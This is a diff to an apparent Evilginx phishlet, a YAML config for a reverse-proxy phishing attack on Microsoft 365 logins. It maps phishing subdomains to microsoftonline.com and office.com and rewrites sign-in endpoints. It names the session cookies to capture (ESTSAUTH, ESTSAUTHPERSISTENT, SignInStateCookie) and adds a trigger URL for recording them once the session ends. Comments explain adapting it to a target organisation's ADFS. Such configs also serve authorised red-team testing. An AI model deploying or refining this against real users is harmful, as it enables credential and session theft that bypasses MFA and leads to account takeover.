@@ -3,7 +3,8 @@ author: '@jamescullum'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoftonline.com', session: false, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false}
   # The lines below are needed if your target organization utilizes ADFS.
   # If they do, you need to uncomment all following lines that contain <...>
   # To get the correct ADFS subdomain, test the web login manually and check where you are redirected.
@@ -14,6 +15,9 @@ proxy_hosts:
   #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>', session: true, is_landing:false}
   #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>:443', session: true, is_landing:false}
 sub_filters:
+  - {hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/GetSessionState.srf', replace: 'https://{hostname}/GetSessionState.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
   # Uncomment and fill in if your target organization utilizes ADFS
@@ -23,6 +27,8 @@ auth_tokens:
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
   - domain: 'login.microsoftonline.com'
     keys: ['SignInStateCookie']
+auth_urls:
+  - '/kmsi*' # to tell EG that the session is over once this URL is displayed (and therefore to record the cookies)
 credentials:
   username:
     key: '(login|UserName)'
